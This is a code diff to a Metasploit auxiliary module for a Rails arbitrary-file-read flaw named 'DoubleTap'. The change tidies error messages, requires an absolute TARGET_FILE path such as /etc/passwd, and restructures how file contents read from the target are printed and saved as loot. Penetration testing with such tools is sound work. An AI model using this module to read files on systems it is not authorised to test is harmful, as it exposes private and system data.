@@ -78,7 +78,7 @@ class MetasploitModule < Msf::Auxiliary
       print_good 'Target is vulnerable!'
       return true
     else
-      print_error 'Target is not vulnerable.'
+      print_error 'Target is not vulnerable. Make sure your route is correct.'
       return false
     end
   end
@@ -86,6 +86,11 @@ class MetasploitModule < Msf::Auxiliary
   def run
     unless check
       print_error 'Check did not pass, exiting.'
+      return
+    end
+
+    unless datastore['TARGET_FILE'][0] == '/'
+      print_error "TARGET_FILE must be an absolute path (eg. /etc/passwd)."
       return
     end
 
@@ -105,10 +110,10 @@ class MetasploitModule < Msf::Auxiliary
     unless res.code == 200
       print_error "Failed to read file: #{datastore['TARGET_FILE']}. HTTP error: #{res.code}."
       print_error 'User probably doesnt have access to the requested file.' if res.code == 500
-    else
-      print_good 'Response from server:'
-      print_line res.body.to_s
-      store_loot('rails.doubletap', 'text/plain', datastore['RHOSTS'], res.body.to_s, "rails_doubletap_read_file_#{Rex::Text.rand_text_alpha(8)}.txt", "File read via Rails DoubleTap exploit.")
+      return
     end
+    print_good 'Response from server:'
+    print_line res.body.to_s
+    store_loot('rails.doubletap.file', 'text/plain', datastore['RHOSTS'], res.body.to_s, datastore['TARGET_FILE'], "File read via Rails DoubleTap auxiliary module.")
   end
 end
